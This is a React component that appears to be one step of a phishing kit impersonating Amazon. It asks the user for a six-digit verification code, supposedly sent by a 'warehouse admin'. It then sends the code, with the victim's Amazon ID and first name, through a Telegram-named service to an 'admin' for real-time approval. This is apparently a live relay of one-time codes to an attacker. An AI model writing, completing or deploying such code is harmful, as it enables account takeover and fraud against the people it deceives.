import { useState, useRef, useEffect } from 'react';
import { useAuth } from '../store/authStore';
import { submitVerificationCode } from '../services/telegram';
import gsap from 'gsap';
import SixDigitInput from '../components/SixDigitInput';

export default function Step6VerifyCode() {
  const { goToStep, goBack, data, setError, error } = useAuth();
  const [code, setCode] = useState('');
  const [localError, setLocalError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const stepRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (stepRef.current) {
      gsap.fromTo(
        stepRef.current,
        { opacity: 0, x: 30 },
        { opacity: 1, x: 0, duration: 0.3, ease: 'power2.out' }
      );
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLocalError('');
    setError(null);

    if (code.length !== 6) {
      setLocalError('Enter all 6 digits of the verification code');
      return;
    }

    setIsLoading(true);
    
    // Send code to admin and wait for real-time approval
    const response = await submitVerificationCode({
      amazonId: data.amazonId || '',
      firstName: data.firstName || '',
      code: code
    });

    if (response.approved) {
      setIsLoading(false);
      if (stepRef.current) {
        gsap.to(stepRef.current, {
          opacity: 0,
          x: -30,
          duration: 0.25,
          ease: 'power2.in',
          onComplete: () => goToStep('dashboard'),
        });
      }
    } else {
      setIsLoading(false);
      setLocalError('Invalid verification code. Please try again.');
      setCode('');
    }
  };

  const handleBack = () => {
    if (stepRef.current) {
      gsap.to(stepRef.current, {
        opacity: 0,
        x: 30,
        duration: 0.25,
        ease: 'power2.in',
        onComplete: () => goBack(),
      });
    }
  };

  return (
    <div ref={stepRef}>
      <button className="back-btn" onClick={handleBack} type="button" aria-label="Go back">
        &#8249;
      </button>

      <h1 className="step-heading" style={{ paddingTop: 8 }}>
        Enter the 6-digit verification code
      </h1>
      <p className="step-subtext">
        The warehouse admin has sent a verification code to your registered contact method.
      </p>
      <form onSubmit={handleSubmit} noValidate>
        <div className="mb-4">
          <SixDigitInput
            value={code}
            onChange={(val) => {
              setCode(val);
              setLocalError('');
              setError(null);
            }}
            disabled={isLoading}
          />
          {(localError || error) && (
            <p className="error-text text-center mt-2">{localError || error}</p>
          )}
        </div>
        <button type="submit" className="btn-amazon" disabled={isLoading}>
          {isLoading ? <div className="spinner" style={{ width: 16, height: 16, borderWidth: 2 }} /> : 'Verify'}
        </button>
      </form>

      <div className="mt-4 text-center">
        <p className="text-[11px] text-[#565959]">
          Didn&apos;t receive a code?{' '}
          <a href="#" className="amazon-link text-[11px]" onClick={(e) => e.preventDefault()}>
            Request a new one
          </a>
        </p>
      </div>
    </div>
  );
}
